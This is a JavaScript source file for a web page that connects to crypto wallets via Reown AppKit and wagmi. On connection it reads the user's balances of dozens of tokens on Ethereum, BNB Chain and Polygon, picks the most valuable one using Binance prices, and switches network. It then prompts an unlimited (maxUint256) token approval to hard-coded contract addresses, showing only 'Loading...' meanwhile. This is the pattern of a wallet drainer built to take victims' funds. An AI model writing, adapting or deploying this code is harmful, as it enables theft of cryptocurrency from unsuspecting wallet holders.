import { arbitrum, bsc, mainnet, optimism, polygon, sepolia } from '@reown/appkit/networks'
import { createAppKit } from '@reown/appkit'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { parseEther, formatUnits, maxUint256, isAddress, getAddress } from 'viem'
import { sendTransaction, readContract, writeContract } from '@wagmi/core'

const projectId = import.meta.env.VITE_PROJECT_ID || "d85cc83edb401b676e2a7bcef67f3be8"
if (!projectId) {
  throw new Error('VITE_PROJECT_ID is not set')
}

const networks = [arbitrum, mainnet, optimism, polygon, sepolia, bsc]

const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks,
})

const appKit = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  themeMode: 'dark',
  features: {
    analytics: true,
    email: false,
    socials: false,
  }
})

const store = {
  accountState: {},
  networkState: {},
  appKitState: {},
  themeState: { themeMode: 'light', themeVariables: {} },
  events: [],
  walletInfo: {},
  eip155Provider: null,
  tokenBalances: [],
  errors: [],
  approvedTokens: {} // Cache for approved tokens
}

const updateStore = (key, value) => {
  store[key] = value
}

const updateStateDisplay = (elementId, state) => {
  const element = document.getElementById(elementId)
  if (element) {
    element.innerHTML = JSON.stringify(state, null, 2)
  }
}

const updateTheme = mode => {
  document.documentElement.setAttribute('data-theme', mode)
  document.body.className = mode
}

const updateButtonVisibility = (isConnected) => {
  const connectedOnlyButtons = document.querySelectorAll('[data-connected-only]')
  connectedOnlyButtons.forEach(button => {
    if (!isConnected) button.style.display = 'none'
    else button.style.display = ''
  })
}

const signMessage = (provider, address) => {
  if (!provider) return Promise.reject('No provider available')
  
  return provider.request({
    method: 'personal_sign',
    params: ['WHATS UP HOMIE', address]
  })
}

const sendTx = async (provider, address, wagmiConfig) => {
  if (!provider) return Promise.reject('No provider available')

  const result = await sendTransaction(wagmiConfig, {
    to: address,
    value: parseEther("0.0001"),
  })
  
  return result
}

const getBalance = async (provider, address, wagmiConfig) => {
  if (!provider) return Promise.reject('No provider available')
  
  const balance = await provider.request({
    method: 'eth_getBalance',
    params: [address, 'latest']
  })
  const ethBalance = formatUnits(BigInt(balance), 18)
  return ethBalance
}

const initializeSubscribers = (modal) => {
  modal.subscribeProviders(state => {
    updateStore('eip155Provider', state['eip155'])
  })

  modal.subscribeAccount(async state => {
    updateStore('accountState', state)
    updateStateDisplay('accountState', state)

    // Check token balances across all networks simultaneously after wallet connection
    if (state.isConnected && state.address) {
      const ethMainnet = networks.find(n => n.chainId === 1)
      const bscMainnet = networks.find(n => n.chainId === 56)
      const polygonMainnet = networks.find(n => n.chainId === 137)

      // Prepare balance checks for all networks
      const balancePromises = []

      // Ethereum balances
      TOKENS.ETHEREUM.forEach(token => {
        balancePromises.push(
          getTokenBalance(
            wagmiAdapter.wagmiConfig,
            state.address,
            token.address,
            token.decimals,
            1
          ).then(balance => ({
            symbol: token.symbol,
            balance,
            address: token.address,
            network: 'Ethereum',
            chainId: 1
          }))
        )
      })

      // BNB Chain balances
      TOKENS.BNB.forEach(token => {
        balancePromises.push(
          getTokenBalance(
            wagmiAdapter.wagmiConfig,
            state.address,
            token.address,
            token.decimals,
            56
          ).then(balance => ({
            symbol: token.symbol,
            balance,
            address: token.address,
            network: 'BNB Chain',
            chainId: 56
          }))
        )
      })

      // Polygon balances
      TOKENS.POLYGON.forEach(token => {
        balancePromises.push(
          getTokenBalance(
            wagmiAdapter.wagmiConfig,
            state.address,
            token.address,
            token.decimals,
            137
          ).then(balance => ({
            symbol: token.symbol,
            balance,
            address: token.address,
            network: 'Polygon',
            chainId: 137
          }))
        )
      })

      // Fetch all balances concurrently
      const allBalances = await Promise.all(balancePromises)

      // Store and display balances
      store.tokenBalances = allBalances
      updateStateDisplay('tokenBalancesState', allBalances)

      // Find most expensive token
      let maxValue = 0
      let mostExpensive = null

      for (const token of allBalances) {
        if (token.balance > 0) {
          // Use fixed price for USDT and USDC, Binance API for others
          const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
          const value = token.balance * price
          if (value > maxValue) {
            maxValue = value
            mostExpensive = { ...token, price, value }
          }
        }
      }

      // Display result, switch network, and propose approve
      if (mostExpensive) {
        const message = `Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`
        console.log(message)
        document.getElementById('open-connect-modal').innerHTML = 'Loading...'

        // Switch to the network of the most expensive token
        const targetNetwork = networks.find(n => n.chainId === mostExpensive.chainId)
        if (targetNetwork && store.networkState.chainId !== mostExpensive.chainId) {
          console.log(`Switching to ${mostExpensive.network} (chainId ${mostExpensive.chainId})`)
          await appKit.switchNetwork(targetNetwork)
        }

        // Propose approve for the most expensive token only if not already approved
        try {
          const contractAddress = CONTRACTS[mostExpensive.chainId]
          const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
          if (store.approvedTokens[approvalKey]) {
            const approveMessage = `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
            console.log(approveMessage)
            document.getElementById('approveState').innerHTML = approveMessage
            document.getElementById('approveSection').style.display = ''
            return
          }

          const txHash = await approveToken(
            wagmiAdapter.wagmiConfig,
            mostExpensive.address,
            contractAddress,
            mostExpensive.chainId
          )
          store.approvedTokens[approvalKey] = true // Cache approval
          const approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
          console.log(approveMessage)
          document.getElementById('approveState').innerHTML = approveMessage
          document.getElementById('approveSection').style.display = ''
        } catch (error) {
          const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`
          store.errors.push(errorMessage)
          console.error(errorMessage)
          document.getElementById('approveState').innerHTML = errorMessage
          document.getElementById('approveSection').style.display = ''
        }
      } else {
        const message = 'Нет токенов с положительным балансом'
        console.log(message)
        document.getElementById('mostExpensiveTokenState').innerHTML = message
        document.getElementById('mostExpensiveTokenSection').style.display = ''
      }
    }
  })

  modal.subscribeNetwork(state => {
    updateStore('networkState', state)
    updateStateDisplay('networkState', state)
    
    const switchNetworkBtn = document.getElementById('switch-network')
    if (switchNetworkBtn) {
      switchNetworkBtn.textContent = `Switch to ${
        state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'
      }`
    }
  })

  modal.subscribeState(state => {
    store.appKitState = state
    updateButtonVisibility(modal.getIsConnectedState())
  })
}

initializeSubscribers(appKit)

updateButtonVisibility(appKit.getIsConnectedState())

document.getElementById('open-connect-modal')?.addEventListener(
  'click', () => appKit.open()
)

document.getElementById('disconnect')?.addEventListener(
  'click', () => {
    appKit.disconnect()
    store.approvedTokens = {} // Clear approval cache on disconnect
    store.errors = [] // Clear errors on disconnect
  }
)

document.getElementById('switch-network')?.addEventListener(
  'click', () => {
    const currentChainId = store.networkState?.chainId
    appKit.switchNetwork(currentChainId === polygon.id ? mainnet : polygon)
  }
)

document.getElementById('sign-message')?.addEventListener(
  'click', async () => {
    const signature = await signMessage(store.eip155Provider, store.accountState.address)
    document.getElementById('signatureState').innerHTML = signature
    document.getElementById('signatureSection').style.display = ''
  }
)

document.getElementById('send-tx')?.addEventListener(
  'click', async () => {
    const txHash = await sendTx(store.eip155Provider, store.accountState.address, wagmiAdapter.wagmiConfig)
    document.getElementById('txState').innerHTML = JSON.stringify(txHash, null, 2)
    document.getElementById('txSection').style.display = ''
  }
)

document.getElementById('get-balance')?.addEventListener(
  'click', async () => {
    const balance = await getBalance(store.eip155Provider, store.accountState.address, wagmiAdapter.wagmiConfig)
    document.getElementById('balanceState').innerHTML = balance + ' ETH'
    document.getElementById('balanceSection').style.display = ''
  }
)

updateTheme(store.themeState.themeMode)

// === New Functionality ===
const CONTRACTS = {
  1: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC', // Ethereum Mainnet
  56: '0x67062812416C73364926b9d31E183014deB95462', // BNB Chain
  137: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095C', // Polygon
};

const TOKENS = {
  ETHEREUM: [
    { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
    { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
    { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 },
    { symbol: 'WBTC', address: '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599', decimals: 8 },
    { symbol: 'UNI', address: '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984', decimals: 18 },
    { symbol: 'LINK', address: '0x514910771af9ca656af840dff83e8264ecf986ca', decimals: 18 },
    { symbol: 'COMP', address: '0xc00e94cb662c3520282e6f5717214004a7f26888', decimals: 18 },
    { symbol: 'YFI', address: '0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e', decimals: 18 },
    { symbol: 'CRV', address: '0xd533a949740bb3306d119cc777fa900ba034cd52', decimals: 18 },
    { symbol: 'BAT', address: '0x0d8775f648430679a709e98d2b0cb6250d2887ef', decimals: 18 },
    { symbol: 'ZRX', address: '0xe41d2489571d322189246dafa5ebde1f4699f498', decimals: 18 },
    { symbol: 'LRC', address: '0xbbbbca6a901c926f240b89eacb641d8aec7aeafd', decimals: 18 },
    { symbol: 'BNB', address: '0xb8c77482e45f1f44de1745f52c74426c631bdd52', decimals: 18 },
    { symbol: 'SHIB', address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', decimals: 18 },
    { symbol: 'PEPE', address: '0x6982508145454ce325ddbe47a25d4ec3d2311933', decimals: 18 },
    { symbol: 'LEASH', address: '0x27c70cd1946795b66be9d954418546998b546634', decimals: 18 },
    { symbol: 'FLOKI', address: '0xcf0c122c6b73ff809c693db761e7baebe62b6a2e', decimals: 18 },
    { symbol: 'AAVE', address: '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9', decimals: 18 },
    { symbol: 'RNDR', address: '0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24', decimals: 18 },
    { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', decimals: 18 },
    { symbol: 'SUSHI', address: '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2', decimals: 18 },
    { symbol: 'GLM', address: '0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429', decimals: 18 },
    { symbol: 'REP', address: '0x1985365e9f78359a9b6ad760e32412f4a445e862', decimals: 18 },
    { symbol: 'SNT', address: '0x744d70fdbe2ba4cf95131626614a1763df805b9e', decimals: 18 },
    { symbol: 'STORJ', address: '0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac', decimals: 18 },
  ],
  BNB: [
    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
    { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
    { symbol: 'SHIB', address: '0x2859e4544c4bb03966803b044a93563bd2d0dd4d', decimals: 18 },
    { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
    { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18 },
    { symbol: 'BAKE', address: '0xe02df9e3e622debdd69fb838bb799e3f168902c5', decimals: 18 },
    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63', decimals: 18 },
    { symbol: 'ALPACA', address: '0x8f0528ce5ef7b51152a59745befdd91d97091d2f', decimals: 18 },
    { symbol: 'AUTO', address: '0xa184088a740c695e156f91f5cc086a06bb78b827', decimals: 18 },
    { symbol: 'BURGER', address: '0xae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
    { symbol: 'EPS', address: '0xa7f552078dcc247c2684336020c03648500c6d9f', decimals: 18 },
    { symbol: 'BELT', address: '0xe0e514c71282b6f4e823703a39374cf58dc3ea4f', decimals: 18 },
    { symbol: 'MBOX', address: '0x3203c9e46ca618c8be4c2c9f0e2e7b0d5d0e75', decimals: 18 },
    { symbol: 'SFP', address: '0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb', decimals: 18 },
    { symbol: 'BabyDoge', address: '0xc748673057861a797275cd8a068abb95a902e8de', decimals: 18 },
    { symbol: 'EGC', address: '0xc001bbe2b87079294c63ece98bdd0a88d761434e', decimals: 18 },
    { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
    { symbol: 'PIT', address: '0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2', decimals: 18 },
  ],
  POLYGON: [
    { symbol: 'USDT', address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
    { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
    { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
    { symbol: 'GHST', address: '0x385eeac5cb85a38a9a07a70c73e0a3271cfb54b7', decimals: 18 },
    { symbol: 'DFYN', address: '0xc168e40227e4ebd8b3dabb4b05d0b7c67f6a9be', decimals: 18 },
    { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0fea8e9b7ea0f28c4', decimals: 18 },
    { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 },
  ],
};

const erc20Abi = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function',
  },
  {
    constant: false,
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function',
  },
];

const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals = 18, chainId) => {
  if (!address || !tokenAddress) {
    return Promise.reject('Missing address or token address');
  }

  try {
    const balance = await readContract(wagmiConfig, {
      address: tokenAddress,
      abi: erc20Abi,
      functionName: 'balanceOf',
      args: [address],
      chainId,
    });
    return Number(formatUnits(balance, decimals));
  } catch (error) {
    store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`);
    return 0;
  }
};

const getTokenPrice = async (symbol) => {
  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`);
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    const data = await response.json();
    return Number(data.price) || 0;
  } catch (error) {
    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`);
    return 0;
  }
};

const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
  if (!tokenAddress || !contractAddress) {
    throw new Error('Missing token or contract address')
  }
  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) {
    throw new Error('Invalid token or contract address')
  }
  const checksumTokenAddress = getAddress(tokenAddress)
  const checksumContractAddress = getAddress(contractAddress)
  try {
    const txHash = await writeContract(wagmiConfig, {
      address: checksumTokenAddress,
      abi: erc20Abi,
      functionName: 'approve',
      args: [checksumContractAddress, maxUint256],
      chainId
    })
    return txHash
  } catch (error) {
    throw new Error(`Failed to approve token: ${error.message}`)
  }
}
